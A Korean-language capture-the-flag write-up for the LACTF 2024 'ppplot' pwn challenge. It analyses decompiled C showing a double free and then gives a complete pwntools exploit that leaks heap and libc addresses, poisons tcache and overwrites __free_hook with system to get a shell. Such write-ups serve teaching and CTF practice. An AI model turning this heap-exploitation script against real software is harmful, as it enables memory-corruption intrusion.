---
title: "LACTF 2024 - ppplot"
dateString: March 2024
draft: false
tags: ["LACTF2024","LACTF ppplot"]
weight: 30
date: 2024-03-09
categories: ["CTF"]
# cover:
    # image: ""
---
# ppplot
## Analysis
```c
int __fastcall arith(int flag)
{
  uint64_t *v1; // rax
  unsigned int res; // eax
  char v3; // cl
  int i; // [rsp+1Ch] [rbp-14h]
  int idx; // [rsp+20h] [rbp-10h]
  unsigned int v7; // [rsp+24h] [rbp-Ch]
  eq_obj *obj; // [rsp+28h] [rbp-8h]

  printf("idx: ");
  idx = read_int();
  if ( (unsigned int)idx < 128 )
  {
    v1 = (uint64_t *)obj_list_[idx];
    obj = (eq_obj *)v1;
    for ( i = 0; i <= 63; ++i )
    {
      res = calc(obj, i - 0x20);
      v7 = res + 0x20;
      LODWORD(v1) = printf("(%d, %d)\n", (unsigned int)(i - 0x20), res);
      if ( v7 <= 0x3F )
      {
        if ( flag )
          v3 = '.';
        else
          v3 = '@';
        v1 = (uint64_t *)&buf[0x40 * (__int64)(int)v7 + i];
        *(_BYTE *)v1 = v3;
      }
    }
  }
  else
  {
    LODWORD(v1) = puts("index out of bounds");
  }
  return (int)v1;
}
void sub_15F4()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  printf("idx: ");
  v0 = read_int();
  if ( v0 < 0x80 )
    free(obj_list_[v0]);
  else
    puts("index out of bounds");
}
```
double free가 발생한다.
```c
__int64 __fastcall calc(eq_obj *obj, int a2)
{
  unsigned int v3; // [rsp+Ch] [rbp-10h]
  signed int term_iter; // [rsp+10h] [rbp-Ch]
  int v5; // [rsp+14h] [rbp-8h]
  signed int i; // [rsp+18h] [rbp-4h]

  v3 = 0;
  for ( term_iter = 0; term_iter < (signed int)obj->degree; ++term_iter )
  {
    v5 = 1;
    for ( i = 0; i < term_iter; ++i )
      v5 *= a2;
    v3 += v5 * obj->term_list[term_iter];
  }
  return v3;
}                                               // 1x + (cx) + (c^2*x1) + (c^3*x)
                                                // 1x + -(cx) + (c^2*x1) + -(c^3*x)
```
다항식을 입력받는다.

주석에 달린것 처럼 연산이 된다.

## Exploitation
DFB가 발생한다는 것은, dangling pointer가 남는다는 의미다.
dangling pointer가 남았다면 free된 상태에서 연산이 가능하다는 의미다.
free된 상태에서의 힙주소를 leak할 수 있게 된다.
```
1*x + c*x1 + c^2*x2 + c^3*x3 
1*x + -c*x1 + c^2*x2 + -c^3*x3

x,x1=0,0 

c^2*x2 + c^3*x3 
c^2*x2 + -c^3*x3
```
기본적으로 free 이후 tcache에서의 메모리 힙 청크 상태를 확인해보면, x, x1자리가 0이다.
그래서 -1, +1일때의 출력 결과를 바탕으로 주소를 얻어낼 수 있다.

DFB를 통해 임의 청크를 할당해서 size를 변조하고 free한다.
unsorted bin에 위치시키고 main arena가 libc에 위치하고 있으니 이와 doubly linked list로 연결된 unsorted bin을 leak한다.

구글의 nsjail을 이용해서 docker가 배포되었다.
/srv에 우분투가 마운트되고 격리된 프로세스는 /srv를 /로 마운트하는것을 확인했다.
이를 이용해 환경을 구축할 수 있었다.
https://github.com/msh1307/binPatch
옛날에 개발했던 바이너리 패치 도구를 이용해서 환경을 맞춘다.
### Exploit script
```python
from pwn import *
from regex import W
# nsjail mounts /srv/ -> / 
# ubuntu@sha256:f2034e7195f61334e6caff6ecf2e965f92d11e888309065da85ff50c617732b8
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
rvu = lambda x : p.recvuntil(x)

def mk_eq(degree, i : list):
    sla(b'pp: ', str(1))
    sla(b'degree: ',str(degree))
    for iter in range(degree):
        sla(b'enter', str(i[iter]))

def free(idx):
    sla(b'pp: ', str(5))
    sla(b'idx: ', str(idx))

def print_():
    sla(b'pp: ', str(2))
    
def arith(idx):
    sla(b'pp: ', str(3))
    sla(b'idx: ', str(idx))

libc = ELF('./bc.so.6')
p = process('./out.bin') # already patched 
for i in range(0x9):
    mk_eq(10, [26739]*10)
for i in range(0x9):
    free(i)

for i in range(0x7):
    mk_eq(10, [26739]*10)
mk_eq(0x4, [26739]*4)
free(7) 
# idx 8 -> 4 | idx7

arith(8)

rvu(b'(-1, ')
neg_cx = int(rvu(b')')[:-1])

rvu(b'(1, ')
pos_cx = int(rvu(b')')[:-1])

v = (((neg_cx + pos_cx))//2)
heap = ( (((pos_cx - v)) << 32) | v&0xffffffff )
success(hex(heap))
mk_eq(2,[0]*2) # idx 17

for i in range(9):
    mk_eq(10,[0]*10)
for i in range(9):
    free(i+18)
free(7+18)

for i in range(3):
    mk_eq(0,[])

target = heap + 0x280
mk_eq(4,[target&0xffffffff,target>>32,0,0])
mk_eq(8,[0]*8)
mk_eq(4,[0,0,0x461,0])
# +0x460, there's a prev inusebit enabled sz. 
free(0)

# just reclaiming a freed chunk and changing a content ptr let me leak libc.
mk_eq(10,[0]*10) # 33
mk_eq(10,[0]*10) # 34
free(33)
free(34)
target = heap + 0x338
mk_eq(4,[4,0,target,target>>32]) 
'''
gef> x/4xg 0x55db06567330+8
0x55db06567338: 0x00000000000003c1      0x00007fe33e2c6be0
0x55db06567348: 0x00007fe33e2c6be0      0x0000000000000000'''

arith(33)
rvu(b'(-1, ')
neg_cx = int(rvu(b')')[:-1])

rvu(b'(1, ')
pos_cx = int(rvu(b')')[:-1])

v = (((neg_cx + pos_cx))//2)
libc_base = ( (((pos_cx - v)) << 32) | v&0xffffffff ) - 0x1ecbe0
success(hex(libc_base))

mk_eq(10,[0]*10)
mk_eq(10,[0]*10)
free(36)
free(37)
mk_eq(4,[26739]*4)



for i in range(9):
    mk_eq(10,[0]*10)
for i in range(9):
    free(i+38)
free(7+38)

for i in range(3):
    mk_eq(0,[])
target = libc_base + libc.sym.__free_hook
mk_eq(4,[target&0xffffffff,target>>32,0,0])
mk_eq(8,[0]*8)
mk_eq(4,[(libc_base+libc.sym.system)&0xffffffff,(libc_base+libc.sym.system)>>32,0,0])

# +0x460, there's a prev inuse bit enabled sz. 
free(36)


p.interactive()
```